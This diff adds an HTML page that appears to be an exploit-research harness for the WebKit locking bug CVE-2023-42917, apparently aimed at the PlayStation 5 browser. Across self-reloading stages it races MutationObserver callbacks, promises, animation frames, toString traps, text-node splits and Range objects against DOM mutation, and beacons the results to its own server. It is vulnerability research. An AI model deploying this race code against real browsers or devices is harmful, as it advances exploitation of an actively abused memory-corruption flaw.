@@ -1,0 +1,426 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1197 WebKit Locking Race (CVE-2023-42917)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1197 — CVE-2023-42917 LOCKING RACE</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">iterations: 0</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1197-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* P1197: CVE-2023-42917 — Memory corruption via unsynchronized locking
+   Fixed in Safari 17.1.2 with "improved locking". PS5 = Safari 17.0 = pre-patch.
+   Exploited in the wild (Google TAG / CISA KEV).
+
+   The bug is about unsynchronized shared memory access during JS + DOM work.
+   Strategy: create high-contention scenarios between:
+   - DOM tree mutations and async JS callbacks
+   - MutationObserver callbacks that modify observed nodes
+   - Promise microtask resolution during DOM layout
+   - requestAnimationFrame + heavy DOM mutation races
+   - Getter/setter traps during DOM property access
+
+   Each stage runs a tight race loop and reports if anything unusual happens
+   (crash = between ATTEMPT and RESULT, stale data, wrong values, etc). */
+
+(function run(){
+var STAGES=[
+  'detect',
+  'mutationRace',       /* MutationObserver callback modifies observed tree */
+  'promiseDomRace',     /* Promise resolution chain vs DOM mutation */
+  'rafTreeRace',        /* rAF callback vs JS-driven tree rebuild */
+  'getterDomRace',      /* Getter traps fire during DOM operations */
+  'textNodeSplice',     /* Rapid text node splitting during iteration */
+  'rangeCollapse'       /* Range objects spanning rapidly mutating tree */
+];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1197_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1197_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/'+(STAGES.length-1)+' — '+(STAGES[stage]||'done'));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  var summary=JSON.stringify(results).slice(0,800);
+  B('ALL-DONE',summary);
+  log('=== ALL STAGES COMPLETE ===','ok');
+  addFind(summary);
+  try{localStorage.removeItem('p1197_stage');localStorage.removeItem('p1197_res');}catch(e){}
+  return;
+}
+try{localStorage.setItem('p1197_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+var iters=0;
+
+function done(rep){
+  results.push({s:stage,n:cur,r:rep,i:iters});
+  try{localStorage.setItem('p1197_res',JSON.stringify(results));}catch(e){}
+  B('RESULT','['+cur+']'+rep.slice(0,600));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ('+iters+' iters) ===','ok');
+  B('NEXT','stage='+(stage+1));
+  setTimeout(function(){location.reload(true);},600);
+}
+
+/* ---- STAGE: detect ---- */
+if(cur==='detect'){
+  setPhase('Feature detection');
+  var info=[];
+  info.push('MO='+(typeof MutationObserver));
+  info.push('rAF='+(typeof requestAnimationFrame));
+  info.push('Promise='+(typeof Promise));
+  info.push('Range='+(typeof Range));
+  info.push('TreeWalker='+(typeof document.createTreeWalker));
+  info.push('qSA='+(typeof document.querySelectorAll));
+  done(info.join('|'));
+
+/* ---- STAGE: mutationRace ---- */
+}else if(cur==='mutationRace'){
+  setPhase('MutationObserver self-mutation race');
+  B('ATTEMPT','mutationRace');
+  var container=document.createElement('div');
+  document.body.appendChild(container);
+  var anomalies=0,total=0;
+
+  var obs=new MutationObserver(function(muts){
+    for(var m=0;m<muts.length;m++){
+      total++;
+      /* During observation callback, mutate the tree aggressively */
+      try{
+        var target=muts[m].target;
+        if(target&&target.parentNode){
+          var sib=document.createElement('span');
+          sib.textContent='x';
+          target.parentNode.insertBefore(sib,target);
+          target.parentNode.removeChild(sib);
+          /* Also replace the observed node itself */
+          var repl=document.createElement('div');
+          repl.textContent='r'+total;
+          if(target.parentNode){
+            target.parentNode.replaceChild(repl,target);
+            /* Put original back */
+            repl.parentNode.replaceChild(target,repl);
+          }
+        }
+      }catch(e){anomalies++;}
+    }
+  });
+  obs.observe(container,{childList:true,subtree:true,characterData:true});
+
+  /* Drive rapid mutations */
+  var ROUNDS=500;
+  for(var i=0;i<ROUNDS;i++){
+    iters++;
+    var el=document.createElement('div');
+    el.textContent='node'+i;
+    container.appendChild(el);
+    if(i%3===0&&container.firstChild){
+      container.removeChild(container.firstChild);
+    }
+    if(i%7===0){
+      var walker=document.createTreeWalker(container,NodeFilter.SHOW_ELEMENT);
+      var count=0;
+      while(walker.nextNode()&&count<10){
+        count++;
+        try{walker.currentNode.textContent='w'+i;}catch(e){}
+      }
+    }
+  }
+  /* Force observer flush */
+  obs.takeRecords();
+  obs.disconnect();
+  container.parentNode.removeChild(container);
+
+  done('total='+total+'|anomalies='+anomalies+'|iters='+iters+'|children='+(container.childNodes.length));
+
+/* ---- STAGE: promiseDomRace ---- */
+}else if(cur==='promiseDomRace'){
+  setPhase('Promise microtask vs DOM mutation');
+  B('ATTEMPT','promiseDomRace');
+  var div2=document.createElement('div');
+  document.body.appendChild(div2);
+  var promiseResults=[],domResults=[];
+  var ITERS=200;
+
+  /* Create a chain of promises that read/write DOM */
+  var chain=Promise.resolve();
+  for(var j=0;j<ITERS;j++){
+    (function(idx){
+      chain=chain.then(function(){
+        iters++;
+        /* Read DOM state during microtask */
+        var kids=div2.childNodes.length;
+        var el=document.createElement('p');
+        el.setAttribute('data-idx',''+idx);
+        el.textContent='p'+idx;
+        div2.appendChild(el);
+        /* Immediately remove some nodes */
+        if(div2.childNodes.length>10){
+          try{div2.removeChild(div2.firstChild);}catch(e){}
+        }
+        promiseResults.push(kids);
+        return idx;
+      });
+    })(j);
+  }
+
+  /* Simultaneously drive synchronous DOM mutations */
+  var syncTimer=setInterval(function(){
+    for(var k=0;k<20;k++){
+      var s=document.createElement('span');
+      s.textContent='s';
+      div2.appendChild(s);
+      if(div2.childNodes.length>15){
+        try{div2.removeChild(div2.firstChild);}catch(e){}
+      }
+    }
+    domResults.push(div2.childNodes.length);
+  },0);
+
+  chain.then(function(){
+    clearInterval(syncTimer);
+    div2.parentNode.removeChild(div2);
+    /* Check for anomalies: non-monotonic child counts, negative values, etc */
+    var anomCount=0;
+    for(var q=1;q<promiseResults.length;q++){
+      if(promiseResults[q]<0)anomCount++;
+    }
+    done('pResults='+promiseResults.length+'|dResults='+domResults.length+'|anomalies='+anomCount+'|iters='+iters);
+  });
+  return;
+
+/* ---- STAGE: rafTreeRace ---- */
+}else if(cur==='rafTreeRace'){
+  setPhase('requestAnimationFrame vs tree rebuild');
+  B('ATTEMPT','rafTreeRace');
+  var div3=document.createElement('div');
+  div3.style.cssText='width:100px;height:100px;overflow:hidden';
+  document.body.appendChild(div3);
+  var rafCount=0,rebuildCount=0,anomalies3=0;
+  var MAX_RAF=60;
+
+  function rafLoop(){
+    if(rafCount>=MAX_RAF){
+      div3.parentNode.removeChild(div3);
+      done('raf='+rafCount+'|rebuilds='+rebuildCount+'|anomalies='+anomalies3+'|iters='+iters);
+      return;
+    }
+    rafCount++;
+    iters++;
+    requestAnimationFrame(function(){
+      /* During rAF, read layout properties to force synchronous layout */
+      try{
+        var h=div3.offsetHeight;
+        var w=div3.scrollWidth;
+        var rect=div3.getBoundingClientRect();
+        /* Simultaneously mutate the tree */
+        div3.innerHTML='';
+        for(var n=0;n<50;n++){
+          var c=document.createElement('div');
+          c.style.cssText='width:'+((n*7)%100)+'px;height:10px;background:#333';
+          c.textContent='r'+rafCount+'n'+n;
+          div3.appendChild(c);
+        }
+        /* Force layout again while tree is half-built */
+        var h2=div3.offsetHeight;
+        if(h2<0||w<0)anomalies3++;
+        rebuildCount++;
+      }catch(e){anomalies3++;}
+      rafLoop();
+    });
+  }
+  rafLoop();
+  return;
+
+/* ---- STAGE: getterDomRace ---- */
+}else if(cur==='getterDomRace'){
+  setPhase('Getter traps during DOM property access');
+  B('ATTEMPT','getterDomRace');
+  var div4=document.createElement('div');
+  document.body.appendChild(div4);
+  var getterFires=0,anomalies4=0;
+  var ITERS4=300;
+
+  /* Create objects with getters that mutate DOM when accessed */
+  for(var g=0;g<ITERS4;g++){
+    iters++;
+    var el4=document.createElement('div');
+    el4.textContent='base'+g;
+    div4.appendChild(el4);
+
+    /* Define hostile toString on the element */
+    el4.toString=function(){
+      getterFires++;
+      /* Mutate tree during string conversion */
+      try{
+        var victim=div4.firstChild;
+        if(victim&&victim.parentNode){
+          div4.removeChild(victim);
+          div4.appendChild(victim);
+        }
+      }catch(e){anomalies4++;}
+      return 'trap'+getterFires;
+    };
+
+    /* Trigger various DOM operations that may call toString internally */
+    try{
+      el4.setAttribute('data-val',''+el4);
+      var clone=el4.cloneNode(true);
+      div4.insertBefore(clone,el4);
+      div4.normalize();
+    }catch(e){anomalies4++;}
+
+    /* Clean up periodically */
+    if(div4.childNodes.length>50){
+      while(div4.childNodes.length>10){
+        try{div4.removeChild(div4.lastChild);}catch(e){break;}
+      }
+    }
+  }
+  div4.parentNode.removeChild(div4);
+  done('getterFires='+getterFires+'|anomalies='+anomalies4+'|iters='+iters);
+
+/* ---- STAGE: textNodeSplice ---- */
+}else if(cur==='textNodeSplice'){
+  setPhase('Text node rapid split+merge during iteration');
+  B('ATTEMPT','textNodeSplice');
+  var div5=document.createElement('div');
+  document.body.appendChild(div5);
+  var splits=0,anomalies5=0;
+  var ITERS5=200;
+
+  for(var t=0;t<ITERS5;t++){
+    iters++;
+    /* Build a text-heavy subtree */
+    div5.innerHTML='';
+    var txt=document.createTextNode('A'.repeat(100)+'B'.repeat(100)+'C'.repeat(100));
+    div5.appendChild(txt);
+
+    /* Split the text node while iterating */
+    try{
+      var walker5=document.createTreeWalker(div5,NodeFilter.SHOW_TEXT);
+      var node5=walker5.firstChild();
+      if(node5&&node5.length>50){
+        var second=node5.splitText(50);
+        splits++;
+        /* Now iterate further — walker should handle the split */
+        var next5=walker5.nextNode();
+        if(next5){
+          next5.splitText(Math.min(25,next5.length));
+          splits++;
+        }
+        /* Merge everything back */
+        div5.normalize();
+        /* Check integrity */
+        if(div5.firstChild&&div5.firstChild.length!==300){
+          anomalies5++;
+          B('ANOMALY','textLen='+div5.firstChild.length+'|expected=300|iter='+t);
+        }
+      }
+    }catch(e){anomalies5++;}
+  }
+  div5.parentNode.removeChild(div5);
+  done('splits='+splits+'|anomalies='+anomalies5+'|iters='+iters);
+
+/* ---- STAGE: rangeCollapse ---- */
+}else if(cur==='rangeCollapse'){
+  setPhase('Range objects on mutating tree');
+  B('ATTEMPT','rangeCollapse');
+  var div6=document.createElement('div');
+  document.body.appendChild(div6);
+  var rangeOps=0,anomalies6=0;
+  var ITERS6=200;
+
+  for(var q=0;q<ITERS6;q++){
+    iters++;
+    /* Build tree */
+    div6.innerHTML='<p>aaa</p><p>bbb</p><p>ccc</p><p>ddd</p>';
+    try{
+      var range6=document.createRange();
+      range6.setStart(div6.childNodes[0].firstChild,1);
+      range6.setEnd(div6.childNodes[2].firstChild,2);
+      rangeOps++;
+
+      /* Mutate nodes that the range spans */
+      div6.removeChild(div6.childNodes[1]);
+      rangeOps++;
+
+      /* Try to use the range after mutation */
+      try{
+        var frag=range6.cloneContents();
+        rangeOps++;
+        var fragLen=frag.childNodes.length;
+        if(fragLen<0)anomalies6++;
+      }catch(e2){/* Expected — range may be invalid */}
+
+      /* Collapse and re-extend */
+      range6.collapse(true);
+      if(div6.childNodes.length>=2){
+        try{
+          range6.setEnd(div6.childNodes[div6.childNodes.length-1].firstChild||div6.childNodes[div6.childNodes.length-1],0);
+          var contents=range6.extractContents();
+          rangeOps++;
+          div6.appendChild(contents);
+        }catch(e3){}
+      }
+      range6.detach();
+    }catch(e){anomalies6++;}
+  }
+  div6.parentNode.removeChild(div6);
+  done('rangeOps='+rangeOps+'|anomalies='+anomalies6+'|iters='+iters);
+}
+
+})(); /* end IIFE */
+
+/* Reload poller */
+(function(){
+  var cur='P1197-race-locking';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
